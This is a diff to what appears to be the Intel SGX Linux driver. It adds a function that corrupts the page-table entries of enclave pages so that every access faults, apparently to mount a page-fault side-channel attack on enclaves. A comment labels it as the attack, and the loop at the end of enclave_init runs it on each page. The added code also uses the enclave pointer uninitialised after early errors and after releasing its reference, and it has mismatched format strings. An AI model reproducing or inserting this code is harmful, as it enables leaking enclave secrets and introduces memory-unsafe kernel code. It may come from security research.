@@ -634,6 +634,67 @@ out:
 	return ret;
 }
 
+/**
+ * set_rsvd_bit() - set reserved bit of pte corresponding to given enclave and 
+ * virtual address 
+ * @enclave    an enclave
+ * @vaddr      virtual address
+ *
+ * Set 51th bit of page table entry to intentionally invoke page fault. 
+ * Page fault invoked by PF_RSVD is easily recognizable.
+ */
+static long set_rsvd_bit(struct isgx_enclave *enclave, uint64_t vaddr)
+{
+        pgd_t *pgd;
+        pud_t *pud;
+        pmd_t *pmd;
+        pte_t *ptep;
+        pte_t pte;
+        uint64_t one = 1;
+        uint64_t reserved_bit = (one << 50) | (one << 51);
+        uint64_t ignored_bit = (one << 9);
+
+        isgx_info(enclave, "set_rsvd_bit is called vaddr:%p\n", vaddr);
+        pgd = pgd_offset(enclave->mm, vaddr);
+        if (pgd_none(*pgd) || pgd_bad(*pgd)) {
+            isgx_info(enclave, "pgd bad value\n");
+            return -1;
+        }
+
+        pud = pud_offset(pgd, vaddr);
+        if (pud_none(*pud) || pud_bad(*pud)) {
+            isgx_info(enclave, "pud bad value\n");
+            return -1;
+        }
+
+        pmd = pmd_offset(pud, vaddr);
+        if (pmd_none(*pmd) || pmd_bad(*pmd)) {
+            isgx_info(enclave, "pmd bad value\n");
+            return -1;
+        }
+
+        ptep = pte_offset_map(pmd, vaddr);
+        if (!ptep) {
+            isgx_info(enclave, "ptep is NULL\n");
+            return -1;
+        }
+
+        isgx_info(enclave, "ptep is %llx\n", ptep);
+
+        if (pte_present(*ptep)) {
+            //isgx_info(enclave, "reserved_bit is %llx, pte is %llx, pte is present", reserved_bit, pte.pte);
+            //isgx_info(enclave, "changed pte will be %llx\n", (uint64_t)pte.pte | reserved_bit);
+            ptep->pte = ptep->pte | reserved_bit;
+            ptep->pte = ptep->pte ^ one;
+            ptep->pte = ptep->pte | ignored_bit;
+        }
+        else {
+            isgx_info(enclave, "pte is not present. vaddr is %p\n", vaddr);
+        }
+        pte_unmap(ptep);
+        return 0;
+}
+
 static long isgx_ioctl_enclave_init(struct file *filep, unsigned int cmd,
 				    unsigned long arg)
 {
@@ -644,7 +705,10 @@ static long isgx_ioctl_enclave_init(struct file *filep, unsigned int cmd,
 	struct isgx_einittoken *einittoken;
 	struct isgx_enclave *enclave;
 	struct page *initp_page;
+        unsigned long i = 0;
+        unsigned long epc_num = 0;
 
+        //isgx_info(enclave, "isgx_ioctl_enclave_init called\n");
 	initp_page = alloc_page(GFP_HIGHUSER);
 	if (!initp_page)
 		return -ENOMEM;
@@ -655,16 +719,20 @@ static long isgx_ioctl_enclave_init(struct file *filep, unsigned int cmd,
 
 	ret = copy_from_user(sigstruct, (void *)initp->sigstruct,
 			     SIGSTRUCT_SIZE);
+        //isgx_info(enclave, "copy_from_user1 return %d\n", ret);
+
 	if (ret)
 		goto out_free_page;
 
 	ret = copy_from_user(einittoken, (void *)initp->einittoken,
 			     EINITTOKEN_SIZE);
+        //isgx_info(enclave, "copy_from_user2 return %d\n");
 	if (ret)
 		goto out_free_page;
 
 	ret = get_enclave(enclave_id, &enclave);
-	if (ret)
+        //isgx_info(enclave, "get_enclave return %d\n");
+        if (ret)
 		goto out_free_page;
 
 	mutex_lock(&enclave->lock);
@@ -677,13 +745,28 @@ static long isgx_ioctl_enclave_init(struct file *filep, unsigned int cmd,
 
 	flush_work(&enclave->add_page_work);
 
+        //isgx_info(enclave, "before __isgx_enclave_init\n");
 	ret = __isgx_enclave_init(enclave, sigstruct, einittoken);
 out:
 	kref_put(&enclave->refcount, isgx_enclave_release);
 out_free_page:
 	kunmap(initp_page);
 	__free_page(initp_page);
-	return ret;
+
+        /* To do attack, unmark this comment
+        */
+        if (enclave != NULL) {
+            isgx_info(enclave, "At the end of enclave_init. Base address is %p size is %lx\n", enclave->base, enclave->size);
+            epc_num = enclave->size / 4096;
+            isgx_info(enclave, "epc_num is %d\n", epc_num);
+
+            for (i = 2; i < epc_num; i++) {
+                if (set_rsvd_bit(enclave, enclave->base + i * 4096))
+                    isgx_info(enclave, "set_rsvd_bit failed at %lluth loop\n", i);
+            }
+        }
+
+        return ret;
 }
 
 typedef long (*isgx_ioctl_t)(struct file *filep, unsigned int cmd,
